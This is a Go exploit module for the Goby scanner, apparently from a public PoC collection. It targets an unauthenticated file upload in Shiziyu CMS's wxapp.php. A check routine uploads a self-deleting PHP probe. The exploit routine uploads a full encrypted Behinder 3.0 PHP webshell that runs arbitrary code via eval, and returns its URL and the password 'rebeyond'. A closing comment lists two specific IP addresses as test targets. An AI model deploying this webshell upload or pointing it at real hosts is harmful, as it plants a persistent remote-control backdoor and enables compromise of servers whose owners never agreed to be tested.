package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Shiziyu CMS wxapp.php file upload getshell",
    "Description": "No need to log in for any file upload, return to the webshell path via exp,Using Behinder_v3.0 connection, password is rebeyond",
    "Product": "ShiziyuCMS",
    "Homepage": "https://www.tyha.cn/tag/%e7%8b%ae%e5%ad%90%e9%b1%bc%e7%a4%be%e5%8c%ba%e5%9b%a2%e8%b4%ad/",
    "DisclosureDate": "2021-05-28",
    "Author": "HuaiNian",
    "GobyQuery": "body=\"/seller.php?s=/Public/login\"",
    "Level": "3",
    "Impact": "<p>Unlimited arbitrary file uploads, direct access to Webshell</p>",
    "Recommendation": "<p>Set up a whitelist of suffix names</p>",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "File Upload"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10206"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri_1 := "/wxapp.php?controller=Goods.doPageUpload"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs")
			cfg_1.Data = "\n------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\nContent-Type: image/gif\n\n<?php echo md5(233);unlink(__FILE__);?>\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "image_o") {
					uri_3 := resp.RawBody
					compile := regexp.MustCompile(`"image_o":".*goods\\\/(.*?)\\\/(.*?)"`)
					match := compile.FindStringSubmatch(uri_3)
					uri_2 := "/Uploads/image/goods/" + match[1] + "/" + match[2]
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.FollowRedirect = false
					cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
					if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri_1 := "/wxapp.php?controller=Goods.doPageUpload"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs")
			cfg_1.Data = "\n------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"upfile\"; filename=\"xxxxx.php\"\nContent-Type: image/gif\n\n<?php\n@error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION['k']=$key;$post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post, \"AES128\", $key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}}@call_user_func(new C(),$params);\n?>\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "image_o") {
					res := resp.Utf8Html
					compile := regexp.MustCompile(`"image_o":"(.*?):\\/\\/(.*?)(?:\\/)?\\/Uploads.*?goods\\/(.*?)\\/(.*?)"`)
					match := compile.FindStringSubmatch(res)
					out := "webshell url: " + match[1] + "://" + match[2] + "/Uploads/image/goods/" + match[3] + "/" + match[4] + "\npass: rebeyond\nuse Behinder 3.0 to connect"
					expResult.Output = out
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

//注释：测试地址：https://106.52.29.124/ 或 https://119.45.205.136/
